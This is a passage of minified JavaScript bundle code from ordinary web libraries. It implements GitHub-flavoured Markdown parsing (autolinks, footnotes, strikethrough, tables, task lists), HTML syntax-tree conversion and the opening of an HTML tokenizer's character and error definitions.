l!==87&&l!==119||!BM.call(n,n.previous)||Y1(n.events)?t(l):(a.enter("literalAutolink"),a.enter("literalAutolinkWww"),a.check(aY,a.attempt(qM,a.attempt(kM,r),t),t)(l))}function r(l){return a.exit("literalAutolinkWww"),a.exit("literalAutolink"),e(l)}}function sY(a,e,t){const n=this;let i="",r=!1;return l;function l(h){return(h===72||h===104)&&FM.call(n,n.previous)&&!Y1(n.events)?(a.enter("literalAutolink"),a.enter("literalAutolinkHttp"),i+=String.fromCodePoint(h),a.consume(h),u):t(h)}function u(h){if(Xt(h)&&i.length<5)return i+=String.fromCodePoint(h),a.consume(h),u;if(h===58){const E=i.toLowerCase();if(E==="http"||E==="https")return a.consume(h),d}return t(h)}function d(h){return h===47?(a.consume(h),r?p:(r=!0,d)):t(h)}function p(h){return h===null||wh(h)||Na(h)||ul(h)||hg(h)?t(h):a.attempt(qM,a.attempt(kM,f),t)(h)}function f(h){return a.exit("literalAutolinkHttp"),a.exit("literalAutolink"),e(h)}}function rY(a,e,t){let n=0;return i;function i(l){return(l===87||l===119)&&n<3?(n++,a.consume(l),i):l===46&&n===3?(a.consume(l),r):t(l)}function r(l){return l===null?t(l):e(l)}}function lY(a,e,t){let n,i,r;return l;function l(p){return p===46||p===95?a.check(OM,d,u)(p):p===null||Na(p)||ul(p)||p!==45&&hg(p)?d(p):(r=!0,a.consume(p),l)}function u(p){return p===95?n=!0:(i=n,n=void 0),a.consume(p),l}function d(p){return i||n||!r?t(p):e(p)}}function cY(a,e){let t=0,n=0;return i;function i(l){return l===40?(t++,a.consume(l),i):l===41&&n<t?r(l):l===33||l===34||l===38||l===39||l===41||l===42||l===44||l===46||l===58||l===59||l===60||l===63||l===93||l===95||l===126?a.check(OM,e,r)(l):l===null||Na(l)||ul(l)?e(l):(a.consume(l),i)}function r(l){return l===41&&n++,a.consume(l),i}}function uY(a,e,t){return n;function n(u){return u===33||u===34||u===39||u===41||u===42||u===44||u===46||u===58||u===59||u===63||u===95||u===126?(a.consume(u),n):u===38?(a.consume(u),r):u===93?(a.consume(u),i):u===60||u===null||Na(u)||ul(u)?e(u):t(u)}function i(u){return u===null||u===40||u===91||Na(u)||ul(u)?e(u):n(u)}function r(u){return Xt(u)?l(u):t(u)}function l(u){return u===59?(a.consume(u),n):Xt(u)?(a.consume(u),l):t(u)}}function dY(a,e,t){return n;function n(r){return a.consume(r),i}function i(r){return Gt(r)?t(r):e(r)}}function BM(a){return a===null||a===40||a===42||a===95||a===91||a===93||a===126||Na(a)}function FM(a){return!Xt(a)}function VM(a){return!(a===47||M0(a))}function M0(a){return a===43||a===45||a===46||a===95||Gt(a)}function Y1(a){let e=a.length,t=!1;for(;e--;){const n=a[e][1];if((n.type==="labelLink"||n.type==="labelImage")&&!n._balanced){t=!0;break}if(n._gfmAutolinkLiteralWalkedInto){t=!1;break}}return a.length>0&&!t&&(a[a.length-1][1]._gfmAutolinkLiteralWalkedInto=!0),t}const pY={tokenize:EY,partial:!0};function mY(){return{document:{91:{name:"gfmFootnoteDefinition",tokenize:bY,continuation:{tokenize:vY},exit:yY}},text:{91:{name:"gfmFootnoteCall",tokenize:gY},93:{name:"gfmPotentialFootnoteCall",add:"after",tokenize:fY,resolveTo:hY}}}}function fY(a,e,t){const n=this;let i=n.events.length;const r=n.parser.gfmFootnotes||(n.parser.gfmFootnotes=[]);let l;for(;i--;){const d=n.events[i][1];if(d.type==="labelImage"){l=d;break}if(d.type==="gfmFootnoteCall"||d.type==="labelLink"||d.type==="label"||d.type==="image"||d.type==="link")break}return u;function u(d){if(!l||!l._balanced)return t(d);const p=Ci(n.sliceSerialize({start:l.end,end:n.now()}));return p.codePointAt(0)!==94||!r.includes(p.slice(1))?t(d):(a.enter("gfmFootnoteCallLabelMarker"),a.consume(d),a.exit("gfmFootnoteCallLabelMarker"),e(d))}}function hY(a,e){let t=a.length;for(;t--;)if(a[t][1].type==="labelImage"&&a[t][0]==="enter"){a[t][1];break}a[t+1][1].type="data",a[t+3][1].type="gfmFootnoteCallLabelMarker";const n={type:"gfmFootnoteCall",start:Object.assign({},a[t+3][1].start),end:Object.assign({},a[a.length-1][1].end)},i={type:"gfmFootnoteCallMarker",start:Object.assign({},a[t+3][1].end),end:Object.assign({},a[t+3][1].end)};i.end.column++,i.end.offset++,i.end._bufferIndex++;const r={type:"gfmFootnoteCallString",start:Object.assign({},i.end),end:Object.assign({},a[a.length-1][1].start)},l={type:"chunkString",contentType:"string",start:Object.assign({},r.start),end:Object.assign({},r.end)},u=[a[t+1],a[t+2],["enter",n,e],a[t+3],a[t+4],["enter",i,e],["exit",i,e],["enter",r,e],["enter",l,e],["exit",l,e],["exit",r,e],a[a.length-2],a[a.length-1],["exit",n,e]];return a.splice(t,a.length-t+1,...u),a}function gY(a,e,t){const n=this,i=n.parser.gfmFootnotes||(n.parser.gfmFootnotes=[]);let r=0,l;return u;function u(h){return a.enter("gfmFootnoteCall"),a.enter("gfmFootnoteCallLabelMarker"),a.consume(h),a.exit("gfmFootnoteCallLabelMarker"),d}function d(h){return h!==94?t(h):(a.enter("gfmFootnoteCallMarker"),a.consume(h),a.exit("gfmFootnoteCallMarker"),a.enter("gfmFootnoteCallString"),a.enter("chunkString").contentType="string",p)}function p(h){if(r>999||h===93&&!l||h===null||h===91||Na(h))return t(h);if(h===93){a.exit("chunkString");const E=a.exit("gfmFootnoteCallString");return i.includes(Ci(n.sliceSerialize(E)))?(a.enter("gfmFootnoteCallLabelMarker"),a.consume(h),a.exit("gfmFootnoteCallLabelMarker"),a.exit("gfmFootnoteCall"),e):t(h)}return Na(h)||(l=!0),r++,a.consume(h),h===92?f:p}function f(h){return h===91||h===92||h===93?(a.consume(h),r++,p):p(h)}}function bY(a,e,t){const n=this,i=n.parser.gfmFootnotes||(n.parser.gfmFootnotes=[]);let r,l=0,u;return d;function d(A){return a.enter("gfmFootnoteDefinition")._container=!0,a.enter("gfmFootnoteDefinitionLabel"),a.enter("gfmFootnoteDefinitionLabelMarker"),a.consume(A),a.exit("gfmFootnoteDefinitionLabelMarker"),p}function p(A){return A===94?(a.enter("gfmFootnoteDefinitionMarker"),a.consume(A),a.exit("gfmFootnoteDefinitionMarker"),a.enter("gfmFootnoteDefinitionLabelString"),a.enter("chunkString").contentType="string",f):t(A)}function f(A){if(l>999||A===93&&!u||A===null||A===91||Na(A))return t(A);if(A===93){a.exit("chunkString");const j=a.exit("gfmFootnoteDefinitionLabelString");return r=Ci(n.sliceSerialize(j)),a.enter("gfmFootnoteDefinitionLabelMarker"),a.consume(A),a.exit("gfmFootnoteDefinitionLabelMarker"),a.exit("gfmFootnoteDefinitionLabel"),E}return Na(A)||(u=!0),l++,a.consume(A),A===92?h:f}function h(A){return A===91||A===92||A===93?(a.consume(A),l++,f):f(A)}function E(A){return A===58?(a.enter("definitionMarker"),a.consume(A),a.exit("definitionMarker"),i.includes(r)||i.push(r),ba(a,C,"gfmFootnoteDefinitionWhitespace")):t(A)}function C(A){return e(A)}}function vY(a,e,t){return a.check(_p,e,a.attempt(pY,e,t))}function yY(a){a.exit("gfmFootnoteDefinition")}function EY(a,e,t){const n=this;return ba(a,i,"gfmFootnoteDefinitionIndent",5);function i(r){const l=n.events[n.events.length-1];return l&&l[1].type==="gfmFootnoteDefinitionIndent"&&l[2].sliceSerialize(l[1],!0).length===4?e(r):t(r)}}function SY(a){let t=(a||{}).singleTilde;const n={name:"strikethrough",tokenize:r,resolveAll:i};return t==null&&(t=!0),{text:{126:n},insideSpan:{null:[n]},attentionMarkers:{null:[126]}};function i(l,u){let d=-1;for(;++d<l.length;)if(l[d][0]==="enter"&&l[d][1].type==="strikethroughSequenceTemporary"&&l[d][1]._close){let p=d;for(;p--;)if(l[p][0]==="exit"&&l[p][1].type==="strikethroughSequenceTemporary"&&l[p][1]._open&&l[d][1].end.offset-l[d][1].start.offset===l[p][1].end.offset-l[p][1].start.offset){l[d][1].type="strikethroughSequence",l[p][1].type="strikethroughSequence";const f={type:"strikethrough",start:Object.assign({},l[p][1].start),end:Object.assign({},l[d][1].end)},h={type:"strikethroughText",start:Object.assign({},l[p][1].end),end:Object.assign({},l[d][1].start)},E=[["enter",f,u],["enter",l[p][1],u],["exit",l[p][1],u],["enter",h,u]],C=u.parser.constructs.insideSpan.null;C&&Dn(E,E.length,0,gg(C,l.slice(p+1,d),u)),Dn(E,E.length,0,[["exit",h,u],["enter",l[d][1],u],["exit",l[d][1],u],["exit",f,u]]),Dn(l,p-1,d-p+3,E),d=p+E.length-2;break}}for(d=-1;++d<l.length;)l[d][1].type==="strikethroughSequenceTemporary"&&(l[d][1].type="data");return l}function r(l,u,d){const p=this.previous,f=this.events;let h=0;return E;function E(A){return p===126&&f[f.length-1][1].type!=="characterEscape"?d(A):(l.enter("strikethroughSequenceTemporary"),C(A))}function C(A){const j=qc(p);if(A===126)return h>1?d(A):(l.consume(A),h++,C);if(h<2&&!t)return d(A);const R=l.exit("strikethroughSequenceTemporary"),I=qc(A);return R._open=!I||I===2&&!!j,R._close=!j||j===2&&!!I,u(A)}}}class CY{constructor(){this.map=[]}add(e,t,n){TY(this,e,t,n)}consume(e){if(this.map.sort(function(r,l){return r[0]-l[0]}),this.map.length===0)return;let t=this.map.length;const n=[];for(;t>0;)t-=1,n.push(e.slice(this.map[t][0]+this.map[t][1]),this.map[t][2]),e.length=this.map[t][0];n.push(e.slice()),e.length=0;let i=n.pop();for(;i;){for(const r of i)e.push(r);i=n.pop()}this.map.length=0}}function TY(a,e,t,n){let i=0;if(!(t===0&&n.length===0)){for(;i<a.map.length;){if(a.map[i][0]===e){a.map[i][1]+=t,a.map[i][2].push(...n);return}i+=1}a.map.push([e,t,n])}}function xY(a,e){let t=!1;const n=[];for(;e<a.length;){const i=a[e];if(t){if(i[0]==="enter")i[1].type==="tableContent"&&n.push(a[e+1][1].type==="tableDelimiterMarker"?"left":"none");else if(i[1].type==="tableContent"){if(a[e-1][1].type==="tableDelimiterMarker"){const r=n.length-1;n[r]=n[r]==="left"?"center":"right"}}else if(i[1].type==="tableDelimiterRow")break}else i[0]==="enter"&&i[1].type==="tableDelimiterRow"&&(t=!0);e+=1}return n}function AY(){return{flow:{null:{name:"table",tokenize:PY,resolveAll:LY}}}}function PY(a,e,t){const n=this;let i=0,r=0,l;return u;function u(L){let _=n.events.length-1;for(;_>-1;){const ce=n.events[_][1].type;if(ce==="lineEnding"||ce==="linePrefix")_--;else break}const V=_>-1?n.events[_][1].type:null,F=V==="tableHead"||V==="tableRow"?Q:d;return F===Q&&n.parser.lazy[n.now().line]?t(L):F(L)}function d(L){return a.enter("tableHead"),a.enter("tableRow"),p(L)}function p(L){return L===124||(l=!0,r+=1),f(L)}function f(L){return L===null?t(L):ze(L)?r>1?(r=0,n.interrupt=!0,a.exit("tableRow"),a.enter("lineEnding"),a.consume(L),a.exit("lineEnding"),C):t(L):sa(L)?ba(a,f,"whitespace")(L):(r+=1,l&&(l=!1,i+=1),L===124?(a.enter("tableCellDivider"),a.consume(L),a.exit("tableCellDivider"),l=!0,f):(a.enter("data"),h(L)))}function h(L){return L===null||L===124||Na(L)?(a.exit("data"),f(L)):(a.consume(L),L===92?E:h)}function E(L){return L===92||L===124?(a.consume(L),h):h(L)}function C(L){return n.interrupt=!1,n.parser.lazy[n.now().line]?t(L):(a.enter("tableDelimiterRow"),l=!1,sa(L)?ba(a,A,"linePrefix",n.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(L):A(L))}function A(L){return L===45||L===58?R(L):L===124?(l=!0,a.enter("tableCellDivider"),a.consume(L),a.exit("tableCellDivider"),j):ee(L)}function j(L){return sa(L)?ba(a,R,"whitespace")(L):R(L)}function R(L){return L===58?(r+=1,l=!0,a.enter("tableDelimiterMarker"),a.consume(L),a.exit("tableDelimiterMarker"),I):L===45?(r+=1,I(L)):L===null||ze(L)?Y(L):ee(L)}function I(L){return L===45?(a.enter("tableDelimiterFiller"),w(L)):ee(L)}function w(L){return L===45?(a.consume(L),w):L===58?(l=!0,a.exit("tableDelimiterFiller"),a.enter("tableDelimiterMarker"),a.consume(L),a.exit("tableDelimiterMarker"),k):(a.exit("tableDelimiterFiller"),k(L))}function k(L){return sa(L)?ba(a,Y,"whitespace")(L):Y(L)}function Y(L){return L===124?A(L):L===null||ze(L)?!l||i!==r?ee(L):(a.exit("tableDelimiterRow"),a.exit("tableHead"),e(L)):ee(L)}function ee(L){return t(L)}function Q(L){return a.enter("tableRow"),q(L)}function q(L){return L===124?(a.enter("tableCellDivider"),a.consume(L),a.exit("tableCellDivider"),q):L===null||ze(L)?(a.exit("tableRow"),e(L)):sa(L)?ba(a,q,"whitespace")(L):(a.enter("data"),M(L))}function M(L){return L===null||L===124||Na(L)?(a.exit("data"),q(L)):(a.consume(L),L===92?N:M)}function N(L){return L===92||L===124?(a.consume(L),M):M(L)}}function LY(a,e){let t=-1,n=!0,i=0,r=[0,0,0,0],l=[0,0,0,0],u=!1,d=0,p,f,h;const E=new CY;for(;++t<a.length;){const C=a[t],A=C[1];C[0]==="enter"?A.type==="tableHead"?(u=!1,d!==0&&(lL(E,e,d,p,f),f=void 0,d=0),p={type:"table",start:Object.assign({},A.start),end:Object.assign({},A.end)},E.add(t,0,[["enter",p,e]])):A.type==="tableRow"||A.type==="tableDelimiterRow"?(n=!0,h=void 0,r=[0,0,0,0],l=[0,t+1,0,0],u&&(u=!1,f={type:"tableBody",start:Object.assign({},A.start),end:Object.assign({},A.end)},E.add(t,0,[["enter",f,e]])),i=A.type==="tableDelimiterRow"?2:f?3:1):i&&(A.type==="data"||A.type==="tableDelimiterMarker"||A.type==="tableDelimiterFiller")?(n=!1,l[2]===0&&(r[1]!==0&&(l[0]=l[1],h=Af(E,e,r,i,void 0,h),r=[0,0,0,0]),l[2]=t)):A.type==="tableCellDivider"&&(n?n=!1:(r[1]!==0&&(l[0]=l[1],h=Af(E,e,r,i,void 0,h)),r=l,l=[r[1],t,0,0])):A.type==="tableHead"?(u=!0,d=t):A.type==="tableRow"||A.type==="tableDelimiterRow"?(d=t,r[1]!==0?(l[0]=l[1],h=Af(E,e,r,i,t,h)):l[1]!==0&&(h=Af(E,e,l,i,t,h)),i=0):i&&(A.type==="data"||A.type==="tableDelimiterMarker"||A.type==="tableDelimiterFiller")&&(l[3]=t)}for(d!==0&&lL(E,e,d,p,f),E.consume(e.events),t=-1;++t<e.events.length;){const C=e.events[t];C[0]==="enter"&&C[1].type==="table"&&(C[1]._align=xY(e.events,t))}return a}function Af(a,e,t,n,i,r){const l=n===1?"tableHeader":n===2?"tableDelimiter":"tableData",u="tableContent";t[0]!==0&&(r.end=Object.assign({},mc(e.events,t[0])),a.add(t[0],0,[["exit",r,e]]));const d=mc(e.events,t[1]);if(r={type:l,start:Object.assign({},d),end:Object.assign({},d)},a.add(t[1],0,[["enter",r,e]]),t[2]!==0){const p=mc(e.events,t[2]),f=mc(e.events,t[3]),h={type:u,start:Object.assign({},p),end:Object.assign({},f)};if(a.add(t[2],0,[["enter",h,e]]),n!==2){const E=e.events[t[2]],C=e.events[t[3]];if(E[1].end=Object.assign({},C[1].end),E[1].type="chunkText",E[1].contentType="text",t[3]>t[2]+1){const A=t[2]+1,j=t[3]-t[2]-1;a.add(A,j,[])}}a.add(t[3]+1,0,[["exit",h,e]])}return i!==void 0&&(r.end=Object.assign({},mc(e.events,i)),a.add(i,0,[["exit",r,e]]),r=void 0),r}function lL(a,e,t,n,i){const r=[],l=mc(e.events,t);i&&(i.end=Object.assign({},l),r.push(["exit",i,e])),n.end=Object.assign({},l),r.push(["exit",n,e]),a.add(t+1,0,r)}function mc(a,e){const t=a[e],n=t[0]==="enter"?"start":"end";return t[1][n]}const RY={name:"tasklistCheck",tokenize:wY};function IY(){return{text:{91:RY}}}function wY(a,e,t){const n=this;return i;function i(d){return n.previous!==null||!n._gfmTasklistFirstContentOfListItem?t(d):(a.enter("taskListCheck"),a.enter("taskListCheckMarker"),a.consume(d),a.exit("taskListCheckMarker"),r)}function r(d){return Na(d)?(a.enter("taskListCheckValueUnchecked"),a.consume(d),a.exit("taskListCheckValueUnchecked"),l):d===88||d===120?(a.enter("taskListCheckValueChecked"),a.consume(d),a.exit("taskListCheckValueChecked"),l):t(d)}function l(d){return d===93?(a.enter("taskListCheckMarker"),a.consume(d),a.exit("taskListCheckMarker"),a.exit("taskListCheck"),u):t(d)}function u(d){return ze(d)?e(d):sa(d)?a.check({tokenize:jY},e,t)(d):t(d)}}function jY(a,e,t){return ba(a,n,"whitespace");function n(i){return i===null?t(i):e(i)}}function DY(a){return ZD([nY(),mY(),SY(a),AY(),IY()])}const MY={};function N0(a){const e=this,t=a||MY,n=e.data(),i=n.micromarkExtensions||(n.micromarkExtensions=[]),r=n.fromMarkdownExtensions||(n.fromMarkdownExtensions=[]),l=n.toMarkdownExtensions||(n.toMarkdownExtensions=[]);i.push(DY(t)),r.push(ZK()),l.push(eY(t))}const cL=/[#.]/g;function NY(a,e){const t=a||"",n={};let i=0,r,l;for(;i<t.length;){cL.lastIndex=i;const u=cL.exec(t),d=t.slice(i,u?u.index:t.length);d&&(r?r==="#"?n.id=d:Array.isArray(n.className)?n.className.push(d):n.className=[d]:l=d,i+=d.length),u&&(r=u[0],i++)}return{type:"element",tagName:l||e||"div",properties:n,children:[]}}function HM(a,e,t){const n=t?OY(t):void 0;function i(r,l,...u){let d;if(r==null){d={type:"root",children:[]};const p=l;u.unshift(p)}else{d=NY(r,e);const p=d.tagName.toLowerCase(),f=n?n.get(p):void 0;if(d.tagName=f||p,_Y(l))u.unshift(l);else for(const[h,E]of Object.entries(l))qY(a,d.properties,h,E)}for(const p of u)_0(d.children,p);return d.type==="element"&&d.tagName==="template"&&(d.content={type:"root",children:d.children},d.children=[]),d}return i}function _Y(a){if(a===null||typeof a!="object"||Array.isArray(a))return!0;if(typeof a.type!="string")return!1;const e=a,t=Object.keys(a);for(const n of t){const i=e[n];if(i&&typeof i=="object"){if(!Array.isArray(i))return!0;const r=i;for(const l of r)if(typeof l!="number"&&typeof l!="string")return!0}}return!!("children"in a&&Array.isArray(a.children))}function qY(a,e,t,n){const i=mg(a,t);let r;if(n!=null){if(typeof n=="number"){if(Number.isNaN(n))return;r=n}else typeof n=="boolean"?r=n:typeof n=="string"?i.spaceSeparated?r=CP(n):i.commaSeparated?r=bP(n):i.commaOrSpaceSeparated?r=CP(bP(n).join(" ")):r=uL(i,i.property,n):Array.isArray(n)?r=[...n]:r=i.property==="style"?kY(n):String(n);if(Array.isArray(r)){const l=[];for(const u of r)l.push(uL(i,i.property,u));r=l}i.property==="className"&&Array.isArray(e.className)&&(r=e.className.concat(r)),e[i.property]=r}}function _0(a,e){if(e!=null)if(typeof e=="number"||typeof e=="string")a.push({type:"text",value:String(e)});else if(Array.isArray(e))for(const t of e)_0(a,t);else if(typeof e=="object"&&"type"in e)e.type==="root"?_0(a,e.children):a.push(e);else throw new Error("Expected node, nodes, or string, got `"+e+"`")}function uL(a,e,t){if(typeof t=="string"){if(a.number&&t&&!Number.isNaN(Number(t)))return Number(t);if((a.boolean||a.overloadedBoolean)&&(t===""||lp(t)===lp(e)))return!0}return t}function kY(a){const e=[];for(const[t,n]of Object.entries(a))e.push([t,n].join(": "));return e.join("; ")}function OY(a){const e=new Map;for(const t of a)e.set(t.toLowerCase(),t);return e}const UY=["altGlyph","altGlyphDef","altGlyphItem","animateColor","animateMotion","animateTransform","clipPath","feBlend","feColorMatrix","feComponentTransfer","feComposite","feConvolveMatrix","feDiffuseLighting","feDisplacementMap","feDistantLight","feDropShadow","feFlood","feFuncA","feFuncB","feFuncG","feFuncR","feGaussianBlur","feImage","feMerge","feMergeNode","feMorphology","feOffset","fePointLight","feSpecularLighting","feSpotLight","feTile","feTurbulence","foreignObject","glyphRef","linearGradient","radialGradient","solidColor","textArea","textPath"],zY=HM(Np,"div"),BY=HM(lr,"g",UY);function FY(a){const e=String(a),t=[];return{toOffset:i,toPoint:n};function n(r){if(typeof r=="number"&&r>-1&&r<=e.length){let l=0;for(;;){let u=t[l];if(u===void 0){const d=dL(e,t[l-1]);u=d===-1?e.length+1:d+1,t[l]=u}if(u>r)return{line:l+1,column:r-(l>0?t[l-1]:0)+1,offset:r};l++}}}function i(r){if(r&&typeof r.line=="number"&&typeof r.column=="number"&&!Number.isNaN(r.line)&&!Number.isNaN(r.column)){for(;t.length<r.line;){const u=t[t.length-1],d=dL(e,u),p=d===-1?e.length+1:d+1;if(u===p)break;t.push(p)}const l=(r.line>1?t[r.line-2]:0)+r.column-1;if(l<t[r.line-1])return l}}}function dL(a,e){const t=a.indexOf("\r",e),n=a.indexOf(`
`,e);return n===-1?t:t===-1||t+1===n?n:t<n?t:n}const Kr={html:"http://www.w3.org/1999/xhtml",mathml:"http://www.w3.org/1998/Math/MathML",svg:"http://www.w3.org/2000/svg",xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"},GM={}.hasOwnProperty,VY=Object.prototype;function HY(a,e){const t=e||{};return $1({file:t.file||void 0,location:!1,schema:t.space==="svg"?lr:Np,verbose:t.verbose||!1},a)}function $1(a,e){let t;switch(e.nodeName){case"#comment":{const n=e;return t={type:"comment",value:n.data},Yf(a,n,t),t}case"#document":case"#document-fragment":{const n=e,i="mode"in n?n.mode==="quirks"||n.mode==="limited-quirks":!1;if(t={type:"root",children:QM(a,e.childNodes),data:{quirksMode:i}},a.file&&a.location){const r=String(a.file),l=FY(r),u=l.toPoint(0),d=l.toPoint(r.length);t.position={start:u,end:d}}return t}case"#documentType":{const n=e;return t={type:"doctype"},Yf(a,n,t),t}case"#text":{const n=e;return t={type:"text",value:n.value},Yf(a,n,t),t}default:return t=GY(a,e),t}}function QM(a,e){let t=-1;const n=[];for(;++t<e.length;){const i=$1(a,e[t]);n.push(i)}return n}function GY(a,e){const t=a.schema;a.schema=e.namespaceURI===Kr.svg?lr:Np;let n=-1;const i={};for(;++n<e.attrs.length;){const u=e.attrs[n],d=(u.prefix?u.prefix+":":"")+u.name;GM.call(VY,d)||(i[d]=u.value)}const l=(a.schema.space==="svg"?BY:zY)(e.tagName,i,QM(a,e.childNodes));if(Yf(a,e,l),l.tagName==="template"){const u=e,d=u.sourceCodeLocation,p=d&&d.startTag&&hc(d.startTag),f=d&&d.endTag&&hc(d.endTag),h=$1(a,u.content);p&&f&&a.file&&(h.position={start:p.end,end:f.start}),l.content=h}return a.schema=t,l}function Yf(a,e,t){if("sourceCodeLocation"in e&&e.sourceCodeLocation&&a.file){const n=QY(a,t,e.sourceCodeLocation);n&&(a.location=!0,t.position=n)}}function QY(a,e,t){const n=hc(t);if(e.type==="element"){const i=e.children[e.children.length-1];if(n&&!t.endTag&&i&&i.position&&i.position.end&&(n.end=Object.assign({},i.position.end)),a.verbose){const r={};let l;if(t.attrs)for(l in t.attrs)GM.call(t.attrs,l)&&(r[mg(a.schema,l).property]=hc(t.attrs[l]));t.startTag;const u=hc(t.startTag),d=t.endTag?hc(t.endTag):void 0,p={opening:u};d&&(p.closing=d),p.properties=r,e.data={position:p}}}return n}function hc(a){const e=pL({line:a.startLine,column:a.startCol,offset:a.startOffset}),t=pL({line:a.endLine,column:a.endCol,offset:a.endOffset});return e||t?{start:e,end:t}:void 0}function pL(a){return a.line&&a.column?a:void 0}const JY={},WY={}.hasOwnProperty,JM=xM("type",{handlers:{root:YY,element:a$,text:ZY,comment:e$,doctype:XY}});function KY(a,e){const n=(e||JY).space;return JM(a,n==="svg"?lr:Np)}function YY(a,e){const t={nodeName:"#document",mode:(a.data||{}).quirksMode?"quirks":"no-quirks",childNodes:[]};return t.childNodes=X1(a.children,t,e),Zc(a,t),t}function $Y(a,e){const t={nodeName:"#document-fragment",childNodes:[]};return t.childNodes=X1(a.children,t,e),Zc(a,t),t}function XY(a){const e={nodeName:"#documentType",name:"html",publicId:"",systemId:"",parentNode:null};return Zc(a,e),e}function ZY(a){const e={nodeName:"#text",value:a.value,parentNode:null};return Zc(a,e),e}function e$(a){const e={nodeName:"#comment",data:a.value,parentNode:null};return Zc(a,e),e}function a$(a,e){const t=e;let n=t;a.type==="element"&&a.tagName.toLowerCase()==="svg"&&t.space==="html"&&(n=lr);const i=[];let r;if(a.properties){for(r in a.properties)if(r!=="children"&&WY.call(a.properties,r)){const d=t$(n,r,a.properties[r]);d&&i.push(d)}}const l=n.space,u={nodeName:a.tagName,tagName:a.tagName,attrs:i,namespaceURI:Kr[l],childNodes:[],parentNode:null};return u.childNodes=X1(a.children,u,n),Zc(a,u),a.tagName==="template"&&a.content&&(u.content=$Y(a.content,n)),u}function t$(a,e,t){const n=mg(a,e);if(t===!1||t===null||t===void 0||typeof t=="number"&&Number.isNaN(t)||!t&&n.boolean)return;Array.isArray(t)&&(t=n.commaSeparated?OD(t):QD(t));const i={name:n.attribute,value:t===!0?"":String(t)};if(n.space&&n.space!=="html"&&n.space!=="svg"){const r=i.name.indexOf(":");r<0?i.prefix="":(i.name=i.name.slice(r+1),i.prefix=n.attribute.slice(0,r)),i.namespace=Kr[n.space]}return i}function X1(a,e,t){let n=-1;const i=[];if(a)for(;++n<a.length;){const r=JM(a[n],t);r.parentNode=e,i.push(r)}return i}function Zc(a,e){const t=a.position;t&&t.start&&t.end&&(t.start.offset,t.end.offset,e.sourceCodeLocation={startLine:t.start.line,startCol:t.start.column,startOffset:t.start.offset,endLine:t.end.line,endCol:t.end.column,endOffset:t.end.offset})}const n$=["area","base","basefont","bgsound","br","col","command","embed","frame","hr","image","img","input","keygen","link","meta","param","source","track","wbr"],i$=new Set([65534,65535,131070,131071,196606,196607,262142,262143,327678,327679,393214,393215,458750,458751,524286,524287,589822,589823,655358,655359,720894,720895,786430,786431,851966,851967,917502,917503,983038,983039,1048574,1048575,1114110,1114111]),Ha="";var z;(function(a){a[a.EOF=-1]="EOF",a[a.NULL=0]="NULL",a[a.TABULATION=9]="TABULATION",a[a.CARRIAGE_RETURN=13]="CARRIAGE_RETURN",a[a.LINE_FEED=10]="LINE_FEED",a[a.FORM_FEED=12]="FORM_FEED",a[a.SPACE=32]="SPACE",a[a.EXCLAMATION_MARK=33]="EXCLAMATION_MARK",a[a.QUOTATION_MARK=34]="QUOTATION_MARK",a[a.AMPERSAND=38]="AMPERSAND",a[a.APOSTROPHE=39]="APOSTROPHE",a[a.HYPHEN_MINUS=45]="HYPHEN_MINUS",a[a.SOLIDUS=47]="SOLIDUS",a[a.DIGIT_0=48]="DIGIT_0",a[a.DIGIT_9=57]="DIGIT_9",a[a.SEMICOLON=59]="SEMICOLON",a[a.LESS_THAN_SIGN=60]="LESS_THAN_SIGN",a[a.EQUALS_SIGN=61]="EQUALS_SIGN",a[a.GREATER_THAN_SIGN=62]="GREATER_THAN_SIGN",a[a.QUESTION_MARK=63]="QUESTION_MARK",a[a.LATIN_CAPITAL_A=65]="LATIN_CAPITAL_A",a[a.LATIN_CAPITAL_Z=90]="LATIN_CAPITAL_Z",a[a.RIGHT_SQUARE_BRACKET=93]="RIGHT_SQUARE_BRACKET",a[a.GRAVE_ACCENT=96]="GRAVE_ACCENT",a[a.LATIN_SMALL_A=97]="LATIN_SMALL_A",a[a.LATIN_SMALL_Z=122]="LATIN_SMALL_Z"})(z||(z={}));const mn={DASH_DASH:"--",CDATA_START:"[CDATA[",DOCTYPE:"doctype",SCRIPT:"script",PUBLIC:"public",SYSTEM:"system"};function WM(a){return a>=55296&&a<=57343}function o$(a){return a>=56320&&a<=57343}function s$(a,e){return(a-55296)*1024+9216+e}function KM(a){return a!==32&&a!==10&&a!==13&&a!==9&&a!==12&&a>=1&&a<=31||a>=127&&a<=159}function YM(a){return a>=64976&&a<=65007||i$.has(a)}var pe;(function(a){a.controlCharacterInInputStream="control-character-in-input-stream",a.noncharacterInInputStream="noncharacter-in-input-stream",a.surrogateInInputStream="surrogate-in-input-stream",a.nonVoidHtmlElementStartTagWithTrailingSolidus="non-void-html-element-start-tag-with-trailing-solidus",a.endTagWithAttributes="end-tag-with-attributes",a.endTagWithTrailingSolidus="end-tag-with-trailing-solidus",a.unexpectedSolidusInTag="unexpected-solidus-in-tag",a.unexpectedNullCharacter="unexpected-null-character",a.unexpectedQuestionMarkInsteadOfTagName="unexpected-question-mark-instead-of-tag-name",a.invalidFirstCharacterOfTagName="invalid-first-character-of-tag-name",a.unexpectedEqualsSignBeforeAttributeName="unexpected-equals-sign-before-attribute-name",a.missingEndTagName="missing-end-tag-name",a.unexpectedCharacterInAttributeName="unexpected-character-in-attribute-name",a.unknownNamedCharacterReference="unknown-named-character-reference",a.missingSemicolonAfterCharacterReference="missing-semicolon-after-character-reference",a.unexpectedCharacterAfterDoctypeSystemIdentifier="unexpected-character-after-doctype-system-identifier",a.unexpectedCharacterInUnquotedAttributeValue="unexpected-character-in-unquoted-attribute-value",a.eofBeforeTagName="eof-before-tag-name",a.eofInTag="eof-in-tag",a.missingAttributeValue="missing-attribute-value",a.missingWhitespaceBetweenAttributes="missing-whitespace-between-attributes",a.missingWhitespaceAfterDoctypePublicKeyword="missing-whitespace-after-doctype-public-keyword",a.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers="missing-whitespace-between-doctype-public-and-system-identifiers",a.missingWhitespaceAfterDoctypeSystemKeyword="missing-whitespace-after-doctype-system-keyword",a.missingQuoteBeforeDoctypePublicIdentifier="missing-quote-before-doctype-public-identifier",a.missingQuoteBeforeDoctypeSystemIdentifier="missing-quote-before-doctype-system-identifier",a.missingDoctypePublicIdentifier="missing-doctype-public-identifier",a.missingDoctypeSystemIdentifier="missing-doctype-system-identifier",a.abruptDoctypePublicIdentifier="abrupt-doctype-public-identifier",a.abruptDoctypeSystemIdentifier="abrupt-doctype-system-identifier",